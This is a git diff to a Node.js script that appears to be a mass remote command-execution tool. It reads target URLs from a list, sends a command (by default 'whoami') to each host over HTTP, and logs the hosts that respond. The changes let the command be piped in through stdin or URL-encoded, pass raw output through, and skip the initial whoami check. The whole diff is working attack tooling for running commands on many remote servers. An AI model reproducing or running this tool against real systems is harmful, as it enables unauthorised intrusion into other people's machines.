@@ -1,3 +1,4 @@
+#!/usr/bin/env node
 var fs = require('fs'),
 	request = require('request'),
 	child_process = require("child_process"),
@@ -27,10 +28,23 @@ var a = [],
 	oIps = {},sFilt = '',
 	nTimeout = program.timeout||3,
 	szOut = program.out||"data/Ok1.txt",
-	szCmd2 = program.cmd||'whoami';
+	szCmd2 = decodeURIComponent(program.cmd||'whoami');
 if(program.file)
 	a = fs.readFileSync(program.file || "data/Ok.txt").toString().split(/\n/)
 	,sFilt = program.filter||"192.";
+
+var self = process.stdin,data = [];
+self.on('readable', function() {
+    var chunk = this.read();
+    if (chunk != null)
+    {
+        data.push(chunk);
+    }
+});
+self.on('end', function() {
+    program.cmd = data.join("").trim();
+});
+
 
 function fnDoCmd(url,szCmd1,ip1,fnCbk)
 {
@@ -53,7 +67,7 @@ function fnDoCmd(url,szCmd1,ip1,fnCbk)
 		if(e)console.log(e);
 		else
 		{
-			var s = b.replace(/<!--[^>]*?-->/gmi,'');
+			var s = b;//.replace(/<!--[^>]*?-->/gmi,'');
 			if(s && szCmd1 == "whoami")
 			{
 				oIps[ip1] = s;
@@ -79,25 +93,29 @@ function fnDoUrl(url,ip1,fnCbk)
 	ip = ip && ip[1] || "";
 	
 	if(ip1 && oIps[ip1])return;
+	szWhoami = "";
 	fnCbk || (fnCbk = function(s)
 	{
 		console.log(s);
 	})
-	fnDoCmd(url,'whoami',ip,function(szWhoami)
-	{
-		if(szCmd2 == 'whoami')fnCbk && fnCbk(szWhoami);
-		else fnDoCmd(url,szCmd2,ip,function(s)
+	// console.log("[ " + szCmd2 + " ]");
+	// fnDoCmd(url,'whoami',ip,function(szWhoami)
+	// {
+	// 	if(szCmd2 == 'whoami')fnCbk && fnCbk(szWhoami);
+	// 	else 
+		fnDoCmd(url,szCmd2,ip,function(s)
 		{
 			if(s)
 			{
 				oIps[ip] = szWhoami;
 				// console.log(ip,"(",szWhoami,")","\n",s);
-				fnCbk && fnCbk(ip + "(" + szWhoami + ")\n" + s);
+				// ip + "(" + szWhoami + ")\n" + 
+				fnCbk && fnCbk(s);
 				if(program.out)
 					fs.appendFileSync(szOut, url + "\n");
 			}
 		});
-	});
+	// });
 }
 
 if(program.url)
